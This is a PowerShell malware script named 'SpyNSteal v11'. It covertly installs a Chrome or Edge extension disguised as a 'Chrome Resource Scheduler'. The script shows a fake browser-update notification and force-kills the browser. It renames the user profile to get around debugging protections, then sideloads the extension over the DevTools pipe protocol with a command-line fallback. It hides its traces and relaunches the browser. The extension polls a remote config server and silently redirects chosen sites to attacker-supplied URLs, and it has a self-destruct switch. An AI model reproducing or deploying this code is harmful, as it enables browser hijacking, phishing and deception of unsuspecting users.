# SpyNSteal v11 - Pipe CDP + Extensions.loadUnpacked
# Chrome 136+ blocks debug on default profile -> rename trick
# Extensions.loadUnpacked needs --remote-debugging-pipe + --enable-unsafe-extension-debugging
# Windows pipe handles via --remote-debugging-io-pipes

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    try { Add-Content $LOG "$ts  $msg" } catch {}
}

Add-Type -ReferencedAssemblies @("System.Core") -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;

public class PipeCDP {

    private static void SendCmd(AnonymousPipeServerStream pipe, string json) {
        byte[] b = Encoding.UTF8.GetBytes(json);
        pipe.Write(b, 0, b.Length);
        pipe.WriteByte(0);
        pipe.Flush();
    }

    private static string JsonStr(string json, string key) {
        string p = "\"" + key + "\":\"";
        int s = json.IndexOf(p);
        if (s < 0) return null;
        s += p.Length;
        int e = json.IndexOf("\"", s);
        return (e > s) ? json.Substring(s, e - s) : null;
    }

    private static string WaitFor(List<string> q, object lk, int id, int ms) {
        string t1 = "\"id\":" + id;
        string t2 = "\"id\": " + id;
        DateTime dl = DateTime.Now.AddMilliseconds(ms);
        while (DateTime.Now < dl) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains(t1) || q[i].Contains(t2)) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    public static string LoadExtViaPipe(string chromePath, string userDataDir, string extensionDir) {
        AnonymousPipeServerStream toChrome = null;
        AnonymousPipeServerStream fromChrome = null;
        Process proc = null;

        try {
            toChrome = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
            fromChrome = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);

            string rH = toChrome.GetClientHandleAsString();
            string wH = fromChrome.GetClientHandleAsString();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = chromePath;
            psi.Arguments = String.Format(
                "--remote-debugging-pipe " +
                "--enable-unsafe-extension-debugging " +
                "--user-data-dir=\"{0}\" " +
                "--no-first-run --no-default-browser-check " +
                "--disable-background-networking " +
                "--remote-debugging-io-pipes={1},{2}",
                userDataDir, rH, wH);
            psi.UseShellExecute = false;

            try { proc = Process.Start(psi); }
            catch (Exception ex) { return "ERR:LAUNCH:" + ex.Message; }

            toChrome.DisposeLocalCopyOfClientHandle();
            fromChrome.DisposeLocalCopyOfClientHandle();

            Thread.Sleep(6000);
            if (proc.HasExited) return "ERR:CHROME_DIED:" + proc.ExitCode;

            List<string> q = new List<string>();
            object lk = new object();

            Thread reader = new Thread(delegate() {
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        int bt = fromChrome.ReadByte();
                        if (bt == -1) break;
                        if (bt == 0) {
                            string m = sb.ToString(); sb.Length = 0;
                            if (m.Length > 0) { lock (lk) { q.Add(m); } }
                        } else { sb.Append((char)bt); }
                    }
                } catch {}
            });
            reader.IsBackground = true;
            reader.Start();

            string log = "";

            SendCmd(toChrome,
                "{\"id\":10,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
            string cResp = WaitFor(q, lk, 10, 15000);
            log += "T.create:" + (cResp != null ? "ok" : "null") + "|";

            string tgtId = (cResp != null) ? JsonStr(cResp, "targetId") : null;
            if (tgtId == null) {
                log += "NO_TARGET|";
            } else {
                SendCmd(toChrome,
                    "{\"id\":11,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + tgtId + "\",\"flatten\":true}}");
                string aResp = WaitFor(q, lk, 11, 10000);
                string sessId = (aResp != null) ? JsonStr(aResp, "sessionId") : null;
                log += "attach:" + (sessId != null ? "ok" : "null") + "|";

                if (sessId != null) {
                    Thread.Sleep(3000);

                    SendCmd(toChrome,
                        "{\"id\":12,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                        "\"expression\":\"chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true})\"," +
                        "\"awaitPromise\":true}}");
                    string dResp = WaitFor(q, lk, 12, 10000);
                    log += "devmode:" + (dResp != null ? "ok" : "null") + "|";
                }
            }

            string fwdPath = extensionDir.Replace("\\", "/");
            SendCmd(toChrome,
                "{\"id\":1,\"method\":\"Extensions.loadUnpacked\",\"params\":{\"path\":\"" + fwdPath + "\"}}");
            string extResp = WaitFor(q, lk, 1, 30000);
            log += "ext:" + (extResp != null ? extResp : "null") + "|";

            Thread.Sleep(3000);

            try { SendCmd(toChrome, "{\"id\":99,\"method\":\"Browser.close\"}"); } catch {}

            bool exited = false;
            try { exited = proc.WaitForExit(20000); } catch {}
            if (!exited) { try { proc.Kill(); } catch {} try { proc.WaitForExit(5000); } catch {} }

            proc = null;
            return log;

        } catch (Exception ex) {
            return "ERR:GENERAL:" + ex.Message;
        } finally {
            if (proc != null) {
                try { if (!proc.HasExited) proc.Kill(); } catch {}
                try { proc.WaitForExit(5000); } catch {}
            }
            if (toChrome != null) try { toChrome.Dispose(); } catch {}
            if (fromChrome != null) try { fromChrome.Dispose(); } catch {}
        }
    }
}
"@

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if ($ls.profile.PSObject.Properties["exited_cleanly"]) { $ls.profile.exited_cleanly = $true }
            if ($ls.profile.PSObject.Properties["exit_type"]) { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-AllProcs([string]$procName) {
    for ($k = 0; $k -lt 25; $k++) {
        if (-not (Get-Process $procName -EA SilentlyContinue)) { return $true }
        Get-Process $procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# ============================================================================
Log "=== SpyNSteal v11 ==="

$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension at: $extDir"

$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "$name : Found=$($b.Found) Running=$($b.Running)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers found"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }

foreach ($b in $browsers) {
    $dead = Kill-AllProcs $b.Proc
    Log "$($b.Proc) killed: $dead"
}
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }

$origPath = $target.UserData
$tempPath = $origPath + "_dbg"

Log "--- Processing $($target.Name) ---"
Log "Original: $origPath"
Log "Temp:     $tempPath"

if (Test-Path $tempPath) {
    if (Test-Path $origPath) {
        Remove-Item $tempPath -Recurse -Force -EA SilentlyContinue
    } else {
        Rename-Item $tempPath $origPath -Force -EA SilentlyContinue
    }
}

Log "Renaming profile..."
try {
    Rename-Item $origPath $tempPath -Force -EA Stop
    Log "Renamed to _dbg"
} catch {
    Log "RENAME FAILED: $_"
    Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    exit
}

Patch-LocalState $tempPath

$extDirAbs = (Resolve-Path $extDir).Path
Log "Calling PipeCDP.LoadExtViaPipe..."
Log "  Chrome: $($target.ExePath)"
Log "  UserDir: $tempPath"
Log "  ExtDir: $extDirAbs"

$cdpResult = [PipeCDP]::LoadExtViaPipe($target.ExePath, $tempPath, $extDirAbs)
Log "CDP result: $cdpResult"

Start-Sleep 2
Kill-AllProcs $target.Proc | Out-Null
Start-Sleep 1

$extId = ""
if ($cdpResult -and $cdpResult -notlike "ERR:*") {
    if ($cdpResult -match '"id"\s*:\s*"([a-z]{32})"') {
        $extId = $matches[1]
        Log "Extension ID: $extId"
    }
}

if (-not $extId) {
    Log "Pipe CDP did not return extension ID - trying --load-extension fallback..."

    $fallbackArgs = @(
        "--user-data-dir=`"$tempPath`"",
        "--enable-unsafe-extension-debugging",
        "--load-extension=`"$extDirAbs`"",
        "--disable-features=DisableLoadExtensionCommandLineSwitch",
        "--no-first-run",
        "--no-default-browser-check"
    )
    $argStr = $fallbackArgs -join " "
    Log "Fallback args: $argStr"

    $psi2 = New-Object System.Diagnostics.ProcessStartInfo
    $psi2.FileName = $target.ExePath
    $psi2.Arguments = $argStr
    $psi2.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi2) | Out-Null
    Log "Fallback Chrome launched"

    Start-Sleep 10

    Kill-AllProcs $target.Proc | Out-Null
    Start-Sleep 2
    Log "Fallback Chrome killed"
}

$prefsPath = Join-Path $tempPath "Default\Secure Preferences"
if (-not (Test-Path $prefsPath)) { $prefsPath = Join-Path $tempPath "Default\Preferences" }
$inPrefs = $false
if (Test-Path $prefsPath) {
    try {
        $content = [IO.File]::ReadAllText($prefsPath)
        $fwdDir = $extDirAbs.Replace('\','/')
        $inPrefs = $content.Contains($fwdDir) -or $content.Contains($extDirAbs.Replace('\','\\'))
        if ($extId) { $inPrefs = $inPrefs -or $content.Contains($extId) }
        Log "Extension in prefs: $inPrefs"
    } catch { Log "Prefs read error: $_" }
}

Log "Restoring profile name..."
try {
    Rename-Item $tempPath $origPath -Force -EA Stop
    Log "Profile restored"
} catch {
    Log "RESTORE FAILED: $_ - CRITICAL! Profile at: $tempPath"
}

Patch-LocalState $origPath
Start-Sleep 1

Log "Relaunching Chrome..."
Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"

Log "=== Done (extId=$extId, inPrefs=$inPrefs) ==="
